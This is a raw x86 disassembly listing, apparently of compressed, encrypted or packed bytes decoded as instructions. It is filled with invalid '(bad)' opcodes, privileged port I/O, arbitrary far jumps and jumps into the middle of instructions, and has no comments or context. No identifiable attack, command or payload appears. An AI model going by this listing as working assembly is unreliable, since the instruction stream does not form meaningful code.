  41a238:	push   0xc6962eb8
  41a23d:	pop    esi
  41a23e:	(bad)  
  41a23f:	js     0x41a1cc
  41a241:	mov    edx,esi
  41a243:	retf   0xffe5
  41a246:	cmp    DWORD PTR [ebp-0x67],eax
  41a249:	lods   eax,DWORD PTR ds:[esi]
  41a24a:	push   ecx
  41a24b:	gs leave 
  41a24d:	std    
  41a24e:	sub    DWORD PTR [eax+0x4fb2b752],esi
  41a254:	mov    ds:0xaae8930d,eax
  41a259:	adc    eax,DWORD PTR [edx]
  41a25b:	jno    0x41a27c
  41a25d:	mov    eax,DWORD PTR [esi]
  41a25f:	jne    0x41a2a8
  41a261:	jno    0x41a244
  41a263:	mov    ecx,0x64bdf10
  41a268:	leave  
  41a269:	sbb    bl,BYTE PTR [edi+0xefcf1e5]
  41a26f:	ins    BYTE PTR es:[edi],dx
  41a270:	jbe    0x41a269
  41a272:	stos   DWORD PTR es:[edi],eax
  41a273:	in     al,dx
  41a274:	cmp    BYTE PTR [esi+0x7b],dl
  41a277:	retf   
  41a278:	ficomp WORD PTR [ebx+ebx*8+0x2b]
  41a27c:	jo     0x41a240
  41a27e:	add    DWORD PTR [ebp-0x6b],edx
  41a281:	mov    edi,0x5fb7405e
  41a286:	inc    esp
  41a287:	sbb    eax,0xfc3a6c2e
  41a28c:	xor    al,0xb0
  41a28e:	js     0x41a2c2
  41a290:	sbb    dh,BYTE PTR [ebp+0x6d]
  41a293:	cwde   
  41a294:	mov    dh,0x28
  41a296:	pop    ebx
  41a297:	lock je 0x41a24a
  41a29a:	push   0x43
  41a29c:	rcr    BYTE PTR [ebx+0x37],cl
  41a29f:	push   ecx
  41a2a0:	fwait
  41a2a1:	push   0xfffffff2
  41a2a3:	dec    eax
  41a2a4:	xchg   esp,eax
  41a2a5:	sub    edx,DWORD PTR [edi+0xf]
  41a2a8:	inc    ebp
  41a2a9:	dec    ebx
  41a2aa:	sbb    al,dh
  41a2ac:	cmp    eax,0x43fa7dfd
  41a2b1:	jl     0x41a258
  41a2b3:	adc    BYTE PTR [ecx+0x7b451574],dl
  41a2b9:	jl     0x41a313
  41a2bb:	and    DWORD PTR [ebp-0x62cea7c9],ecx
  41a2c1:	and    ah,BYTE PTR [esi-0x6def4411]
  41a2c7:	add    al,0xcb
  41a2c9:	xor    esp,DWORD PTR [edi+0x7d]
  41a2cc:	ja     0x41a29c
  41a2ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2cf:	sar    BYTE PTR [edx+0x3f],cl
  41a2d2:	dec    edx
  41a2d3:	ins    DWORD PTR es:[edi],dx
  41a2d4:	push   ebp
  41a2d5:	imul   ebp,DWORD PTR [ebx],0x99fdf466
  41a2db:	cmc    
  41a2dc:	push   ds
  41a2dd:	mov    dl,0xc8
  41a2df:	push   es
  41a2e0:	push   edi
  41a2e1:	repnz dec ebx
  41a2e3:	mov    bh,0xd1
  41a2e5:	fidiv  WORD PTR [ecx-0x6866d96d]
  41a2eb:	loopne 0x41a31a
  41a2ed:	sub    eax,DWORD PTR [ecx]
  41a2ef:	mov    es,WORD PTR [esp+eax*1+0xcf11cc1]
  41a2f6:	push   cs
  41a2f7:	iret   
  41a2f8:	and    DWORD PTR [edi+0x4eead0a3],edi
  41a2fe:	add    cl,ch
  41a300:	test   bh,al
  41a302:	sar    BYTE PTR [esi-0x20],1
  41a305:	das    
  41a306:	jns    0x41a32f
  41a308:	mov    dl,al
  41a30a:	inc    esp
  41a30b:	out    dx,eax
  41a30c:	fiadd  DWORD PTR [ebx-0x7f]
  41a30f:	sub    eax,0xcfb263ba
  41a314:	mov    al,0xcf
  41a316:	in     al,dx
  41a317:	xchg   ebx,eax
  41a318:	pusha  
  41a319:	lds    ebp,FWORD PTR [ecx]
  41a31b:	(bad)
  41a31e:	inc    ebx
  41a31f:	inc    BYTE PTR [eax]
  41a321:	shl    BYTE PTR [ecx+0x22cb77dd],0x93
  41a328:	rcl    BYTE PTR [ebx],0x44
  41a32b:	sub    DWORD PTR [ecx],esi
  41a32d:	mov    dl,0x67
  41a32f:	pop    ebx
  41a330:	cmp    DWORD PTR [ebx-0x17],0xffffffbe
  41a334:	fistp  DWORD PTR [esi+ebx*2]
  41a337:	xor    al,0xa4
  41a339:	mov    esi,0x15db1ed9
  41a33e:	inc    ebp
  41a33f:	dec    ebp
  41a340:	sub    BYTE PTR [ebx],ah
  41a342:	test   eax,0x820fe182
  41a347:	out    dx,al
  41a348:	pop    ss
  41a349:	mov    fs,WORD PTR [edx]
  41a34b:	jge    0x41a39e
  41a34d:	mov    ecx,0xb01d3755
  41a352:	jb     0x41a3a0
  41a354:	outs   dx,BYTE PTR ds:[esi]
  41a355:	xchg   ecx,eax
  41a356:	popf   
  41a357:	jo     0x41a370
  41a359:	cmp    eax,DWORD PTR [edx]
  41a35b:	or     eax,0x527d8132
  41a360:	or     al,0xf7
  41a362:	fadd   QWORD PTR [edx-0x38ceb6bb]
  41a368:	fs enter 0x6ebe,0xa0
  41a36d:	sbb    eax,0x4a0714cb
  41a372:	cmp    ebp,eax
  41a374:	loope  0x41a3cc
  41a376:	inc    ebp
  41a377:	jle    0x41a380
  41a379:	mov    edx,0xd1a09b1b
  41a37e:	add    al,0x1c
  41a380:	iret   
  41a381:	xor    BYTE PTR ds:0x5160cfeb,0x48
  41a388:	loope  0x41a332
  41a38a:	dec    esi
  41a38b:	adc    eax,0xaad4e717
  41a390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a391:	xchg   esi,eax
  41a392:	js     0x41a413
  41a394:	sbb    al,0x8b
  41a396:	jle    0x41a3f7
  41a398:	cmc    
  41a399:	jb     0x41a344
  41a39b:	mov    esi,0x5c1f1e9e
  41a3a0:	and    eax,0x25b76c48
  41a3a5:	gs inc edx
  41a3a7:	mov    BYTE PTR [edi+0x33],bl
  41a3aa:	rcr    BYTE PTR [eax],0xf2
  41a3ad:	scas   al,BYTE PTR es:[edi]
  41a3ae:	in     eax,dx
  41a3af:	cld    
  41a3b0:	adc    eax,0xf7c14158
  41a3b5:	bound  esi,QWORD PTR [edi-0x43]
  41a3b8:	adc    esi,DWORD PTR [eax-0x7e]
  41a3bb:	mov    ecx,0x166a8eb3
  41a3c0:	(bad)  
  41a3c1:	outs   dx,DWORD PTR ds:[esi]
  41a3c2:	xchg   edi,eax
  41a3c3:	(bad)  
  41a3c4:	adc    al,0x81
  41a3c6:	adc    al,0x86
  41a3c8:	retf   0x1952
  41a3cb:	xchg   BYTE PTR [ebp-0x5d49d872],bl
  41a3d1:	jne    0x41a3af
  41a3d3:	xor    DWORD PTR ds:0xb399cd5e,esp
  41a3d9:	inc    edi
  41a3da:	lock js 0x41a40a
  41a3dd:	test   BYTE PTR [eax],ch
  41a3df:	imul   esp,DWORD PTR [edx+0x3c],0xffffff9d
  41a3e3:	push   esi
  41a3e4:	jmp    0x41a3a5
  41a3e6:	inc    ecx
  41a3e7:	mov    ecx,0x7e4f3
  41a3ec:	push   0xffffff92
  41a3ee:	add    al,0xe1
  41a3f0:	mov    BYTE PTR [esi+eax*1],ch
  41a3f3:	add    DWORD PTR [esi+0x33],edx
  41a3f6:	test   BYTE PTR [ebp-0x609e36c7],ch
  41a3fc:	call   0x4536:0xc97c75d5
  41a403:	jecxz  0x41a3ca
  41a405:	fld    DWORD PTR [eax+0x64]
  41a408:	fst    DWORD PTR [edx-0x58]
  41a40b:	cmp    cl,ah
  41a40d:	icebp  
  41a40e:	mov    eax,0xe541a7d1
  41a413:	push   edx
  41a414:	adc    eax,0x60f517ea
  41a419:	mov    dh,0xca
  41a41b:	popf   
  41a41c:	(bad)
  41a420:	ret    
  41a421:	add    al,BYTE PTR [esi]
  41a423:	xlat   BYTE PTR ds:[ebx]
  41a424:	js     0x41a3bf
  41a426:	cmp    BYTE PTR [ebx-0x73],0x42
  41a42a:	icebp  
  41a42b:	cdq    
  41a42c:	push   ecx
  41a42d:	sbb    esp,DWORD PTR [ebx+0x31]
  41a430:	cmc    
  41a431:	fisttp WORD PTR [esi]
  41a433:	add    esi,edi
  41a435:	lods   eax,DWORD PTR ds:[esi]
  41a436:	cld    
  41a437:	imul   ebp,DWORD PTR [eax-0x45ab0752],0x44
  41a43e:	sbb    al,0x41
  41a440:	sub    eax,0xb15529d2
  41a445:	(bad)  
  41a446:	out    dx,eax
  41a447:	mov    ebp,0x2668f774
  41a44c:	xchg   ebp,eax
  41a44d:	xchg   BYTE PTR [esi+0x4c1fd665],dl
  41a453:	mov    ch,0x3b
  41a455:	mov    ds:0xeb9db68f,eax
  41a45a:	sar    DWORD PTR [ebp-0x6b],1
  41a45d:	and    BYTE PTR [ebp+0x67],dl
  41a460:	xor    edi,esp
  41a462:	(bad)  
  41a463:	repz xlat BYTE PTR ds:[ebx]
  41a465:	sbb    ch,ah
  41a467:	test   eax,0x5551a7ec
  41a46c:	mov    ecx,0xb527e7fa
  41a471:	(bad)  
  41a472:	and    cl,al
  41a474:	mov    BYTE PTR ds:0x26505d2d,bl
  41a47a:	xchg   esi,eax
  41a47b:	dec    ebp
  41a47c:	xor    al,0xc0
  41a47e:	fcmovb st,st(1)
  41a480:	sub    DWORD PTR [ebp-0x10],esp
  41a483:	or     DWORD PTR [edi-0x39],ebx
  41a486:	ja     0x41a439
  41a488:	cmp    eax,0x2733b885
  41a48d:	mov    dl,0xd2
  41a48f:	lea    esi,[edx]
  41a491:	outs   dx,BYTE PTR ds:[esi]
  41a492:	pushf  
  41a493:	jg     0x41a4b4
  41a495:	push   edx
  41a496:	cdq    
  41a497:	and    esp,ecx
  41a499:	inc    ebp
  41a49a:	lds    esi,FWORD PTR [ebp+0x591e0997]
  41a4a0:	aam    0xb9
  41a4a2:	inc    BYTE PTR [ebp+0x2]
  41a4a5:	(bad)  
  41a4a6:	jno    0x41a524
  41a4a8:	test   BYTE PTR [eax-0x710c8ec8],0xd9
  41a4af:	jns    0x41a493
  41a4b1:	mov    esp,0xe7a04e2a
  41a4b6:	mov    al,0x25
  41a4b8:	mov    ds,WORD PTR [eax]
  41a4ba:	xchg   esi,eax
  41a4bb:	xor    dh,BYTE PTR [ebx]
  41a4bd:	aaa    
  41a4be:	fsub   QWORD PTR [edi]
  41a4c0:	push   0x3b
  41a4c2:	daa    
  41a4c3:	sub    ebx,DWORD PTR [edi-0x2c1b1ce]
  41a4c9:	jo     0x41a4da
  41a4cb:	mov    ds:0xff57986a,eax
  41a4d0:	stos   BYTE PTR es:[edi],al
  41a4d1:	mov    ds:0x6b628418,eax
  41a4d6:	dec    ecx
  41a4d7:	sahf   
  41a4d8:	stos   DWORD PTR es:[edi],eax
  41a4d9:	nop
  41a4da:	test   al,0xa2
  41a4dc:	jo     0x41a48f
  41a4de:	add    BYTE PTR [edi-0x3207949e],ch
  41a4e4:	add    bl,ch
  41a4e6:	mov    al,ds:0x1e2df4d
  41a4eb:	lock mov DWORD PTR [edx-0x17],ebp
  41a4ef:	dec    ebx
  41a4f0:	fs xor ah,dh
  41a4f3:	sbb    esi,DWORD PTR [edx+0x2bc55aa4]
  41a4f9:	mov    edi,0x14c76526
  41a4fe:	dec    ecx
  41a4ff:	sub    bl,bh
  41a501:	jae    0x41a517
  41a503:	fisubr DWORD PTR [eax]
  41a505:	scas   eax,DWORD PTR es:[edi]
  41a506:	in     eax,dx
  41a507:	or     BYTE PTR [edx+0x79],ch
  41a50a:	mov    ebx,0x6db46a65
  41a50f:	bound  esp,QWORD PTR [esi]
  41a511:	xor    ebx,ecx
  41a513:	sti    
  41a514:	inc    esp
  41a515:	xor    DWORD PTR [ecx+0x4f],ebx
  41a518:	(bad)  
  41a519:	call   0xfb23:0xa4516621
  41a520:	mov    bh,0x78
  41a522:	mov    DWORD PTR [eax+ebp*1-0x80],ebp
  41a526:	mov    edx,0x42049e2e
  41a52b:	mov    eax,0xcba22fa9
  41a530:	push   0xffffffdf
  41a532:	push   ebp
  41a533:	js     0x41a518
  41a535:	stos   BYTE PTR es:[edi],al
  41a536:	mov    al,0xd1
  41a538:	out    dx,al
  41a539:	add    BYTE PTR [edx+edi*4],0x47
  41a53d:	out    dx,al
  41a53e:	push   0xffffffb4
  41a540:	(bad)  
  41a541:	sar    BYTE PTR [ecx-0x72],1
  41a544:	and    al,0xd
  41a546:	xor    dl,BYTE PTR [esi+0x3]
  41a549:	sbb    ch,bh
  41a54b:	cmp    edx,DWORD PTR [esi]
  41a54d:	jecxz  0x41a505
  41a54f:	in     eax,dx
  41a550:	sbb    DWORD PTR [edi-0x5e],edx
  41a553:	dec    edi
  41a554:	mov    WORD PTR [esi+0x3746aad8],ss
  41a55a:	mov    ebp,esi
  41a55c:	(bad)  
  41a55d:	jle    0x41a545
  41a55f:	adc    ebp,DWORD PTR ds:0x119f1306
  41a565:	aad    0xaa
  41a567:	not    DWORD PTR [eax]
  41a569:	xchg   ebp,eax
  41a56a:	mov    ebx,DWORD PTR [edx]
  41a56c:	hlt    
  41a56d:	(bad)  
  41a56e:	out    0xeb,al
  41a570:	mov    eax,0x2c206381
  41a575:	test   al,0xa0
  41a577:	sbb    bh,BYTE PTR [eax+0x41]
  41a57a:	inc    ecx
  41a57b:	inc    esi
  41a57c:	aaa    
  41a57d:	loop   0x41a54c
  41a57f:	mul    DWORD PTR [ebp+0x51]
  41a582:	test   ebp,esi
  41a584:	lods   al,BYTE PTR ds:[esi]
  41a585:	addr16 xchg ecx,eax
  41a587:	retf   
  41a588:	jno    0x41a53b
  41a58a:	(bad)  
  41a58b:	fs mov esi,0xc274b16a
  41a591:	or     eax,0xfa169a1
  41a596:	jl     0x41a55a
  41a598:	dec    edx
  41a599:	sub    al,0xeb
  41a59b:	pop    edi
  41a59c:	leave  
  41a59d:	xor    eax,esp
  41a59f:	and    edx,ecx
  41a5a1:	int3   
  41a5a2:	ins    BYTE PTR es:[edi],dx
  41a5a3:	mov    ch,0x91
  41a5a5:	mov    al,0xe6
  41a5a7:	push   es
  41a5a8:	xchg   ebp,eax
  41a5a9:	popa   
  41a5aa:	and    ah,BYTE PTR [ebx]
  41a5ac:	lock mov ebp,0x64f1e605
  41a5b2:	push   edx
  41a5b3:	(bad)  
  41a5b4:	shr    BYTE PTR [edx+edx*8],1
  41a5b7:	inc    ecx
  41a5b8:	xchg   edi,eax
  41a5b9:	mov    edi,0xb6f26b4
  41a5be:	ror    BYTE PTR [ebp-0x5d],0x97
  41a5c2:	in     al,0xe8
  41a5c4:	sahf   
  41a5c5:	mov    ch,0xcf
  41a5c7:	in     al,0x8c
  41a5c9:	aaa    
  41a5ca:	add    eax,0x843f4fbc
  41a5cf:	sub    DWORD PTR [eax],0x24
  41a5d2:	push   edi
  41a5d3:	loopne 0x41a557
  41a5d5:	jno    0x41a5dd
  41a5d7:	xchg   esi,eax
  41a5d8:	fiadd  WORD PTR [esi-0x26]
  41a5db:	sub    al,0x16
  41a5dd:	sahf   
  41a5de:	rcr    DWORD PTR [esi-0x29efa610],cl
  41a5e4:	retf   
  41a5e5:	fild   WORD PTR [ecx-0x7f]
  41a5e8:	fsub   st(7),st
  41a5ea:	push   edx
  41a5eb:	mov    esi,0xb3deb7b9
  41a5f0:	mov    al,0xd7
  41a5f2:	nop
  41a5f3:	retf   
  41a5f4:	dec    DWORD PTR [eax]
  41a5f6:	and    al,0xaf
  41a5f8:	push   ds
  41a5f9:	and    eax,0x6373a582
  41a5fe:	cmp    BYTE PTR [eax-0x3e8e5f8a],al
  41a604:	jg     0x41a667
  41a606:	push   ecx
  41a607:	test   DWORD PTR ss:[edx],0x880d1c00
  41a60e:	shl    DWORD PTR [edi+0x22],0x59
  41a612:	lock outs dx,BYTE PTR ds:[esi]
  41a614:	enter  0x59f1,0x8
  41a618:	pop    ds
  41a619:	out    dx,al
  41a61a:	or     al,BYTE PTR [eax]
  41a61c:	pop    edx
  41a61d:	in     eax,0x9f
  41a61f:	cmp    eax,0x49ac42ee
  41a624:	(bad)  [ecx]
  41a626:	mov    dh,0x69
  41a628:	not    BYTE PTR [edi+0x7b9e3e27]
  41a62e:	mov    bh,0x1c
  41a630:	mov    eax,ds:0x40f1dc50
  41a635:	ss aam 0x89
  41a638:	aas    
  41a639:	adc    eax,0xa43ee6a5
  41a63e:	and    esp,DWORD PTR [edx-0x7a]
  41a641:	xchg   edi,eax
  41a642:	repz cmp BYTE PTR es:[ecx-0xc86ea81],bh
  41a64a:	inc    edi
  41a64b:	retf   0x59af
  41a64e:	mov    bl,0x4c
  41a650:	adc    eax,0xad8e5a81
  41a655:	retf   
  41a656:	jl     0x41a6b5
  41a658:	dec    esp
  41a659:	dec    edi
  41a65a:	mov    eax,ds:0x4007ee54
  41a65f:	pop    esi
  41a660:	stos   BYTE PTR es:[edi],al
  41a661:	sub    eax,0xcfe8f982
  41a666:	sbb    eax,eax
  41a668:	scas   eax,DWORD PTR es:[edi]
  41a669:	dec    eax
  41a66a:	(bad)  
  41a66b:	outs   dx,DWORD PTR ds:[esi]
  41a66c:	xchg   esp,eax
  41a66d:	sub    al,0x95
  41a66f:	xchg   ebx,eax
  41a670:	add    al,0xf0
  41a672:	out    dx,eax
  41a673:	inc    ebp
  41a674:	int3   
  41a675:	scas   al,BYTE PTR es:[edi]
  41a676:	or     ax,0xe723
  41a67a:	dec    esi
  41a67b:	mov    al,0x5
  41a67d:	fild   QWORD PTR [eax-0x75]
  41a680:	mov    al,ds:0xac900411
  41a685:	xchg   edx,eax
  41a686:	stc    
  41a687:	in     al,0x6b
  41a689:	mov    ebp,0x82667c8a
  41a68e:	xor    eax,0x32f29588
  41a693:	test   al,0x7
  41a695:	lods   eax,DWORD PTR ds:[esi]
  41a696:	jecxz  0x41a717
  41a698:	inc    edi
  41a699:	inc    eax
  41a69a:	call   FWORD PTR [ebp-0x5e]
  41a69d:	pushf  
  41a69e:	jl     0x41a6e7
  41a6a0:	pop    esp
  41a6a1:	inc    ecx
  41a6a2:	mov    ebp,0x6d4eba84
  41a6a7:	push   edi
  41a6a8:	mov    WORD PTR [esi],ss
  41a6aa:	loope  0x41a6c4
  41a6ac:	das    
  41a6ad:	in     al,0x45
  41a6af:	mov    al,0x77
  41a6b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6b2:	fs or  al,0x7b
  41a6b5:	mov    edx,0xe9250938
  41a6ba:	adc    DWORD PTR [edx-0x29],esp
  41a6bd:	push   ebp
  41a6be:	mov    cl,0x6
  41a6c0:	in     eax,dx
  41a6c1:	pusha  
  41a6c2:	sbb    eax,ebx
  41a6c4:	jns    0x41a681
  41a6c6:	arpl   WORD PTR [eax+0x6],ax
  41a6c9:	xchg   DWORD PTR [eax+0x92b8273],edi
  41a6cf:	mov    eax,0xe3799403
  41a6d4:	std    
  41a6d5:	pop    ebx
  41a6d6:	clc    
  41a6d7:	mov    esp,0x515be730
  41a6dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6dd:	adc    ecx,0x279e1993
  41a6e3:	loopne 0x41a6bb
  41a6e5:	sub    dh,BYTE PTR [ebp+ecx*1-0x50feb41]
  41a6ec:	add    ebx,DWORD PTR [ebx+0x6e8d5ea5]
  41a6f2:	push   0x50933724
  41a6f7:	or     bh,dh
  41a6f9:	arpl   ax,sp
  41a6fb:	inc    esi
  41a6fc:	add    bl,ch
  41a6fe:	or     ah,bl
  41a700:	cmp    BYTE PTR [edi+0x66],0x79
  41a704:	mov    dh,0xb8
  41a706:	mov    ecx,0x897dfab5
  41a70c:	scas   eax,DWORD PTR es:[edi]
  41a70d:	cdq    
  41a70e:	or     edi,DWORD PTR [ebx+edi*2+0x786532ad]
  41a715:	dec    ebp
  41a716:	xchg   ecx,eax
  41a717:	cwde   
  41a718:	int3   
  41a719:	mov    ch,0xac
  41a71b:	push   es
  41a71c:	(bad)  
  41a71d:	es jmp 0x87b74352
  41a723:	xor    bh,BYTE PTR [ebp-0x7d]
  41a726:	sbb    eax,0xc64da696
  41a72b:	jmp    ebx
  41a72d:	sbb    ebx,ecx
  41a72f:	shr    dl,1
  41a731:	pop    edx
  41a732:	jmp    0xbfca82b0
  41a737:	in     al,dx
  41a738:	mov    ecx,0xcb9c9b02
  41a73d:	test   eax,0x8c5c0dd2
  41a742:	add    BYTE PTR [edi-0x7bd89510],0xfc
  41a749:	push   edx
  41a74a:	lock xchg esi,eax
  41a74c:	popa   
  41a74d:	sbb    BYTE PTR [esi+edx*4],bl
  41a750:	or     eax,0x78c0cd33
  41a755:	nop
  41a756:	push   cs
  41a757:	push   ds
  41a758:	hlt    
  41a759:	mov    dl,0xa9
  41a75b:	(bad)  
  41a75c:	mov    bl,0x9d
  41a75e:	cmp    eax,0x9d68b332
  41a763:	or     al,0xcd
  41a765:	sbb    eax,DWORD PTR [edi+0x5dd69a57]
  41a76b:	xchg   esi,eax
  41a76c:	popa   
  41a76d:	push   ds
  41a76e:	dec    esp
  41a770:	dec    ebp
  41a771:	cld    
  41a772:	call   0xa2d1:0xd6402ce9
  41a779:	aad    0x58
  41a77b:	inc    edx
  41a77c:	sub    al,0x2e
  41a77e:	mov    ebp,0xfff5fead
  41a783:	into   
  41a784:	xor    ch,bl
  41a786:	stc    
  41a787:	lock mov dh,0x5c
  41a78a:	cmp    esp,eax
  41a78c:	icebp  
  41a78d:	dec    esi
  41a78e:	inc    ebp
  41a78f:	inc    edi
  41a790:	xor    al,0xed
  41a792:	lods   eax,DWORD PTR ds:[esi]
  41a793:	xchg   esi,eax
  41a794:	xchg   ebp,eax
  41a795:	sbb    BYTE PTR [ebp-0x1c58a5f1],0xf0
  41a79c:	add    DWORD PTR [edi+0x7a129c66],edx
  41a7a2:	sbb    bl,BYTE PTR [edi+edx*1]
  41a7a5:	cmp    eax,0xbc4c3a4
  41a7aa:	push   eax
  41a7ab:	adc    eax,0x458cd4c3
  41a7b0:	mov    esp,DWORD PTR [ebp+0x71700666]
  41a7b6:	push   ecx
  41a7b7:	pop    es
  41a7b8:	adc    al,al
  41a7ba:	rol    ah,0xd2
  41a7bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7be:	(bad)  
  41a7bf:	jo     0x41a75d
  41a7c1:	sub    bl,0xac
  41a7c4:	mov    eax,0x5b03001c
  41a7c9:	mov    al,0x65
  41a7cb:	or     al,0xaf
  41a7cd:	sub    ebp,DWORD PTR [ebx+0x7269ecdd]
  41a7d3:	adc    DWORD PTR [edi],ebx
  41a7d5:	push   esp
  41a7d6:	cmp    DWORD PTR [ebx+0x19],ebp
  41a7d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7da:	jbe    0x41a82e
  41a7dc:	stos   BYTE PTR es:[edi],al
  41a7dd:	ret    
  41a7de:	sub    eax,0xb676d599
  41a7e3:	(bad)  
  41a7e4:	out    dx,al
  41a7e5:	mov    ebx,0xec25af40
  41a7ea:	and    DWORD PTR [ebx],0x341a8c5
  41a7f0:	or     ch,dl
  41a7f2:	and    eax,0x3983546f
  41a7f7:	and    ebx,DWORD PTR ds:0x3bfb4b44
  41a7fd:	xchg   edx,eax
  41a7fe:	jge    0x41a7cc
  41a800:	test   DWORD PTR [edx-0x28449a31],0xe93b7d46
  41a80a:	repz adc eax,DWORD PTR [ebx-0x128c3187]
  41a811:	dec    BYTE PTR [edi-0x24ce7429]
  41a817:	ja     0x41a841
  41a819:	jns    0x41a7d0
  41a81b:	xor    cl,BYTE PTR [edx-0x13]
  41a81e:	loopne 0x41a7b2
  41a820:	in     al,0xf8
  41a822:	cwde   
  41a823:	and    al,0x91
  41a825:	loope  0x41a858
  41a827:	sbb    DWORD PTR [ebx+0x2cd32c64],ebx
  41a82d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a82e:	out    dx,eax
  41a82f:	les    esp,FWORD PTR [ecx+esi*2+0x2e]
  41a833:	stc    
  41a834:	loopne 0x41a7e8
  41a836:	jp     0x41a835
  41a838:	xor    BYTE PTR [ecx-0x57],bh
  41a83b:	gs iret 
  41a83d:	fisttp QWORD PTR [eax-0x18353cff]
  41a843:	mov    esi,0xae46f96a
  41a848:	inc    eax
  41a849:	mov    ds,eax
  41a84b:	cdq    
  41a84c:	mov    dh,0x13
  41a84e:	arpl   WORD PTR [edi-0x2b],bx
  41a851:	(bad)  
  41a852:	adc    al,0xb0
  41a854:	retf   
  41a855:	mov    ebx,0x7cb048d
  41a85a:	xor    eax,0x764ce3dd
  41a85f:	lds    edx,FWORD PTR [esi+0x5f5f0f2e]
  41a865:	xchg   ebp,eax
  41a866:	mov    edi,0x783edd61
  41a86b:	outs   dx,DWORD PTR ds:[esi]
  41a86c:	inc    ecx
  41a86d:	les    ebx,FWORD PTR [esi+eiz*1-0x5e69e36a]
  41a874:	xchg   edi,eax
  41a875:	mov    dl,0x1b
  41a877:	inc    esp
  41a878:	mov    ds:0x2ff32799,al
  41a87d:	retf   0x1b32
  41a880:	mov    DWORD PTR [ecx+0x2e5d0609],ebx
  41a886:	mov    esp,0xaab6b170
  41a88b:	push   ecx
  41a88c:	inc    edi
  41a88d:	xchg   DWORD PTR [ecx+0x3316a6b3],esi
  41a893:	(bad)  
  41a894:	scas   eax,DWORD PTR es:[edi]
  41a895:	mov    al,ds:0x1cf96bc2
  41a89a:	sbb    al,dh
  41a89c:	jg     0x41a85a
  41a89e:	cli    
  41a89f:	nop
  41a8a0:	add    DWORD PTR [eax-0xe376f50],ebx
  41a8a6:	mov    ebx,0xbe0e06e
  41a8ab:	jmp    0x41a84b
  41a8ad:	outs   dx,DWORD PTR ds:[esi]
  41a8ae:	or     eax,0x3fe61a0b
  41a8b3:	nop
  41a8b4:	dec    edi
  41a8b5:	fwait
  41a8b6:	int3   
  41a8b7:	icebp  
  41a8b8:	cmp    eax,0x538beddb
  41a8bd:	fcom   DWORD PTR [edi+0x7411c0]
  41a8c3:	pop    esp
  41a8c4:	stc    
  41a8c5:	mov    dl,BYTE PTR [ebx]
  41a8c7:	adc    esp,eax
  41a8c9:	pop    esp
  41a8ca:	pop    eax
  41a8cb:	fs jae 0x41a89c
  41a8ce:	fld    DWORD PTR [ebp-0x4996d206]
  41a8d4:	xor    eax,0xbe0784e9
  41a8d9:	shl    cl,cl
  41a8db:	cmp    DWORD PTR [ebx-0x6022eadc],0x1431afa8
  41a8e5:	fbld   TBYTE PTR [ebx]
  41a8e7:	mov    eax,ds:0xe230f3dd
  41a8ec:	inc    ecx
  41a8ed:	mov    ecx,0xc038c4c8
  41a8f2:	mov    BYTE PTR [ebx],dh
  41a8f4:	lds    edx,FWORD PTR [edx-0x4bc96273]
  41a8fa:	in     al,dx
  41a8fb:	inc    ebp
  41a8fc:	cmp    al,0xd6
  41a8fe:	or     DWORD PTR [ebx+0x24],ebp
  41a901:	js     0x41a8f7
  41a903:	fidivr WORD PTR [esi]
  41a905:	iret   
  41a906:	lahf   
  41a907:	fwait
  41a908:	jbe    0x41a8b6
  41a90a:	push   cs
  41a90b:	jl     0x41a8d2
  41a90d:	xor    eax,0x7db08a49
  41a912:	mov    ecx,0x72ee5863
  41a917:	sub    BYTE PTR [esi],bh
  41a919:	nop
  41a91a:	and    al,0x7e
  41a91c:	sub    ah,dl
  41a91e:	cli    
  41a91f:	or     DWORD PTR ds:0x3a2081e5,esi
  41a925:	hlt    
  41a926:	mov    esi,DWORD PTR [edi+0x64e5f036]
  41a92c:	out    dx,al
  41a92d:	add    esi,DWORD PTR [esi-0xd399548]
  41a933:	test   DWORD PTR [ebx-0x59],esi
  41a936:	jmp    FWORD PTR [ebx+0x2697db6]
  41a93c:	fldenv [ebx+0x24e55ec1]
  41a942:	aaa    
  41a943:	jo     0x41a998
  41a945:	sbb    al,0x42
  41a947:	gs enter 0xddc7,0xbb
  41a94c:	sahf   
  41a94d:	lahf   
  41a94e:	cdq    
  41a94f:	outs   dx,BYTE PTR ds:[esi]
  41a950:	add    DWORD PTR [ecx-0x3b],ecx
  41a953:	cmp    ebp,eax
  41a955:	mov    ecx,0x68e1d447
  41a95a:	xchg   edi,esi
  41a95c:	adc    esp,DWORD PTR [edx]
  41a95e:	dec    esi
  41a95f:	push   ecx
  41a960:	and    edi,DWORD PTR [esi]
  41a962:	xor    bh,BYTE PTR [ecx+0x1982555]
  41a968:	pop    ebx
  41a969:	call   0xbc56:0x1cd96ddf
  41a970:	jp     0x41a96c
  41a972:	aaa    
  41a973:	jmp    0x41a97d
  41a975:	ret    0xb88f
  41a978:	gs jge 0x41a977
  41a97b:	scas   al,BYTE PTR es:[edi]
  41a97c:	ret    0x1495
  41a97f:	mov    eax,ds:0x98447517
  41a984:	add    al,0x72
  41a986:	sbb    DWORD PTR [esi+ebp*1],esi
  41a989:	xor    ebp,esp
  41a98b:	xchg   edx,eax
  41a98c:	adc    dl,BYTE PTR [eax]
  41a98e:	mov    al,ds:0x89d1afad
  41a993:	arpl   cx,sp
  41a995:	mov    al,0x89
  41a997:	pop    ecx
  41a998:	xchg   edi,eax
  41a999:	cmp    BYTE PTR [esp+eax*4],0x1f
  41a99d:	hlt    
  41a99e:	xchg   esi,eax
  41a99f:	xchg   BYTE PTR [eax+0xd9e9b89],cl
  41a9a5:	adc    al,0xa6
  41a9a7:	test   BYTE PTR [edi+0x3d],cl
  41a9aa:	popf   
  41a9ab:	leave  
  41a9ac:	jmp    0x205d:0xc24d7990
  41a9b3:	adc    esi,esp
  41a9b5:	ds popa 
  41a9b7:	pop    eax
  41a9b8:	in     eax,0xa2
  41a9ba:	mov    dl,0xe7
  41a9bc:	sub    cl,BYTE PTR [ebx+0x6e]
  41a9bf:	lods   eax,DWORD PTR ds:[esi]
  41a9c0:	ja     0x41a9f3
  41a9c2:	push   ebx
  41a9c3:	scas   eax,DWORD PTR es:[edi]
  41a9c4:	sbb    al,0x1
  41a9c6:	lock mov cl,0x6d
